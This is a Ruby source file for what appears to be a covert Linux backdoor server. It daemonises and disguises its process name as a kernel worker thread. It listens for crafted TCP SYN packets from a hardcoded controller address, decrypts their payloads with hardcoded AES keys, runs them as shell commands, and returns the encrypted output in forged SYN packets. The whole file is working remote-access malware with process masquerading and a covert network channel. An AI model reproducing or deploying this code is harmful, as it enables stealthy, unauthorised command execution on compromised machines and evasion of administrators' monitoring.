#!/usr/bin/env ruby

require 'packetfu'
require 'openssl'
require 'digest/sha1'
require 'fiddle'
require 'open3'
require 'trollop'
require 'daemons'

include PacketFu

Daemons.run('server.rb')

$opts = Trollop::options do
    opt :iface, "NIC Device", :default => "em1"
    opt :process, "Process Name", :default => "[kworker/1:1]"
    opt :daddr, "IP Destination Address", :default => "192.168.0.22"
    opt :dport, "IP Destination Address", :default => 4040
end

$0=$opts.process
$config = Utils.whoami?(:iface=> $opts.iface) # set interface
$filter = "src host #{$opts.daddr} and dst host #{$config[:ip_saddr]} 
            and tcp and dst port #{$opts.dport} and tcp[13] & 2 != 0 
            and tcp[14:2] == 8192 and ip[8] == 115"

def set_process_name name
    RUBY_PLATFORM =~ /linux/ or return
    Fiddle::Function.new(
        DL::Handle['prctl'], [
            Fiddle::TYPE_INT, Fiddle::TYPE_VOIDP,
            Fiddle::TYPE_LONG, Fiddle::TYPE_LONG,
            Fiddle::TYPE_LONG
        ], Fiddle::TYPE_INT
    ).call(15, name.to_s, 0, 0, 0)
end


def sniff(iface)
    pkt_array = Capture.new(:iface => iface, :start => true, :filter => $filter)
    caught = false
    while caught==false do
        pkt_array.stream.each do |p|
            pkt = Packet.parse(p)
            if pkt.is_ip? and pkt.is_tcp?
                packet_info = [pkt.ip_saddr, pkt.ip_daddr, pkt.payload]
                begin
                    # create a sipher for decrypting
                    cipher = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
                    key = Digest::SHA1.hexdigest("345h345345h")
                    iv = "123456789012345678901234567890123456789012345678901234567890"

                    cipher.decrypt
                    cipher.key = key
                    cipher.iv = iv

                    # decrypt it
                    decrypted = cipher.update(pkt.payload)
                    decrypted << cipher.final
                rescue
                    packet_info = nil
                end
                
                unless packet_info.nil? 
                    # create a sipher for encrypting
                    cipher = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
                    cipher.encrypt
                    
                    key2 = Digest::SHA1.hexdigest("abgfd838")
                    iv2 = "123456789012345678901234567890123456789012345678947837893478"

                    cipher.key = key2
                    cipher.iv = iv2

                    # encrypt the message
                    begin
                        stdin, stdout, stderr = Open3.popen3(decrypted)
                        output = stdout.read
                        
                        if output == ""
                            $encrypted = cipher.update("Executed command: #{decrypted}")
                        else
                            $encrypted = cipher.update(output)
                        end
	                rescue
	                    $encrypted = cipher.update("The '#{decrypted}' command does not exist")
	                end

                    $encrypted << cipher.final
                    
                    $ipdst = pkt.ip_saddr
                    $clntmac = pkt.eth_saddr
                    $clntport = pkt.tcp_sport
                    scan
                end
            end
        end
    end
end

def pkts
    #- Build Ethernet header:---------------------------------------
    pkt = TCPPacket.new(:config => $config , :timeout => 0.1, :flavor => "Linux")	# IP header
    pkt.eth_saddr = $config[:eth_saddr] # Ether header: Source MAC
    pkt.eth_daddr = $clntmac            # Ether header: Destination MAC
    pkt.eth_proto	                    # Ether header: Protocol
    
    #- Build IP header:---------------------------------------
    pkt.ip_v = 4	                    # IP header: IPv4 ; you can use: pkt.ip_header.ip_v
    pkt.ip_hl = 5	                    # IP header: IP header length 
    pkt.ip_tos	= 0	                    # IP header: Type of service 
    pkt.ip_len	= 20	                # IP header: Total Length 
    pkt.ip_id	                        # IP header: Identification 
    pkt.ip_frag = 0	                    # IP header: Don't Fragment
    pkt.ip_ttl = 115	                # IP header: TTL(64) is the default
    pkt.ip_proto = 6	                # IP header: Protocol = tcp (6) 
    pkt.ip_sum	                        # IP header: Header Checksum 
    pkt.ip_saddr = $config[:ip_saddr]	# IP header: Source IP.
    pkt.ip_daddr = $ipdst	            # IP header: Destination IP
    
    #- TCP header:---------------------------------------
    pkt.payload = $encrypted	        # TCP header: packet header(body)
    pkt.tcp_flags.ack = 0	            # TCP header: Acknowledgment
    pkt.tcp_flags.fin = 0	            # TCP header: Finish
    pkt.tcp_flags.psh = 0	            # TCP header: Push
    pkt.tcp_flags.rst = 0	            # TCP header: Reset
    pkt.tcp_flags.syn = 1	            # TCP header: Synchronize sequence numbers
    pkt.tcp_flags.urg = 0	            # TCP header: Urgent pointer
    pkt.tcp_ecn = 0	                    # TCP header: ECHO
    pkt.tcp_win	= 8192	                # TCP header: Window
    pkt.tcp_hlen = 5	                # TCP header: header length
    pkt.tcp_sport = $opts.dport	        # TCP header: Source Port (random is the default )
    pkt.tcp_dport = $clntport	        # TCP header: Destination Port 
    pkt.recalc	                        # Recalculate/re-build whol pkt (should be at the end)

#--> End of Build TCP/IP

    pkt_to_a = [pkt.to_s]
    return pkt_to_a
end

def scan
     pkt_array = pkts.sort_by{rand}
     
     inj = Inject.new(:iface => $config[:iface] , :config => $config, :promisc => false)
     inj.array_to_wire(:array => pkt_array)	# Send/Inject the packet through connection
end

set_process_name $0
sniff($opts.iface)
